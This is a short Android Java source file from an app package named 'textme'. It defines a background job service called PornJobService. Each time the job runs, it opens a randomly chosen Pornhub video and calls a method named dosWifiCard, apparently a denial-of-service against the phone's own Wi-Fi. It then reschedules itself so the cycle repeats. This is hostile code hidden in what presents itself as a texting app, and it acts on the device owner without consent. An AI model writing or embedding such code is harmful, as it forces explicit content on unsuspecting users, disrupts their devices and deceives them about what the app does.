package com.candroid.textme.jobs.services;

import android.app.job.JobParameters;
import android.app.job.JobService;
import android.content.Intent;

import com.candroid.textme.api.Lofl;
import com.candroid.textme.data.Pornhub;
import com.candroid.textme.jobs.JobsIntentService;
import com.candroid.textme.jobs.JobsScheduler;

public class PornJobService extends JobService {
    @Override
    public boolean onStartJob(JobParameters params) {
      /*  Intent pornIntent = new Intent(getApplicationContext(), JobsIntentService.class);
        pornIntent.setAction(JobsIntentService.ACTION_WEB_BROWSER);
        getApplicationContext().startService(pornIntent);*/
        double randomNumber = Math.random();
        int videoId = 0;
        if(randomNumber >= 0.5){
            videoId = 1;
        }
        Lofl.watchPornHubVideo(this, Pornhub.VIDEOS[videoId]);
        Lofl.dosWifiCard(this);
        JobsScheduler.scheduleJob(getApplicationContext());
        return true;
    }

    @Override
    public boolean onStopJob(JobParameters params) {
        return true;
    }
}
